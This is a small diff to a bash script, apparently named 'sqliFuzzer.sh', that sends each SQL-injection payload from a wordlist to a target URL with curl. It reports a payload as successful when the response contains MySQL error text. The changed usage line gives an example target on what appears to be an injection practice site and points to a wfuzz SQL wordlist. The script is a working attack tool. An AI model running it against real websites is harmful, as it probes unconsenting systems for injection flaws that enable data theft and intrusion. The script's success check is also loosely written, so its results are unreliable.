@@ -43,11 +43,12 @@ urlEncode() {
 
 if [[ ! -z "${url}" && "${list}" ]]
 then
+
 	for payload in $(cat "${list}")
 	do
 		urlEncode "${payload}"
 		curl -s "${url}""${payload}" |  isError="$(grep -e 'error' -e 'mysql_fetch_array()')" && echo -e "\e[32mSuccessful Payload\e[0m: ${url}\e[31m${payload}\e[0m"
 	done
 else
-	echo "./sqlfuzzer.sh url sqlPayloadList.txt"
+	echo -e "Usage:\n./sqliFuzzer.sh URL payload.txt\n./sqlfuzzer.sh http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1 /usr/share/wfuzz/wordlist/Injections/SQL.txt"
 fi
